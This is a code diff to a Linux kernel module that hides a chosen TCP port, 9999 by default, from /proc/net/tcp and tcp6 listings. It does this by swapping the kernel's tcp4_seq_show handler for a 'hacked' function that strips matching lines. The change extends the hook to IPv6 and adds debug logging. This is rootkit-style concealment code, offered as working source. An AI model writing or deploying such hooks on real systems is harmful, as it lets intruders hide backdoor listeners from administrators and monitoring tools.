@@ -10,8 +10,8 @@
 //#define PORT_TO_HIDE 9999
 
 
-static char* port_to_hide = "9999";
-module_param(port_to_hide, charp, S_IRUGO);
+static int port = 9999;
+module_param(port, int, S_IRUGO);
 
 MODULE_LICENSE("GPL");
 
@@ -39,6 +39,7 @@ struct proc_dir_entry {
 };
 
 int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
+int (*old_tcp6_seq_show)(struct seq_file*, void *) = NULL;
 
 char *strnstr(const char *haystack, const char *needle, size_t n)
 {
@@ -62,11 +63,11 @@ int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
 {
         int retval=old_tcp4_seq_show(seq, v);
 
-        char port[12];
+        char hex_port[12];
 
-        sprintf(port,"%s",port_to_hide);
+        sprintf(hex_port, "%x",port);
 
-        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
+        if(strnstr(seq->buf+seq->count-TMPSZ,hex_port,TMPSZ))
 	        seq->count -= TMPSZ;
 	return retval;   
 }
@@ -86,7 +87,8 @@ static int __init myinit(void)
 	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
 	struct proc_dir_entry *proc_dir_entryptr;
 	struct tcp_seq_afinfo *tcp_seq;
-
+	struct tcp_seq_afinfo *tcp6_seq;
+	
 	/* Get the proc dir entry for /proc/<pid>/net */
 	proc_rb_root = init_net.proc_net->subdir;
 
@@ -95,12 +97,21 @@ static int __init myinit(void)
 
 	while (proc_rb_nodeptr != proc_rb_last) {
 		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
+		printk(KERN_INFO "HIDE PORT: DIR %s", proc_dir_entryptr->name);
 		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
 			tcp_seq = proc_dir_entryptr->data;
 			old_tcp4_seq_show = tcp_seq->seq_ops.show;
 
 			/* Hook the kernel function tcp4_seq_show */
 			tcp_seq->seq_ops.show = hacked_tcp4_seq_show;
+		}
+		else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
+			tcp6_seq = proc_dir_entryptr->data;
+			old_tcp6_seq_show = tcp6_seq->seq_ops.show;
+
+			printk(KERN_INFO "HIDE PORT: FOUND TCP6");
+			/* Hook the kernel function tcp4_seq_show */
+			tcp6_seq->seq_ops.show = hacked_tcp4_seq_show;
 		}
 		
 		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
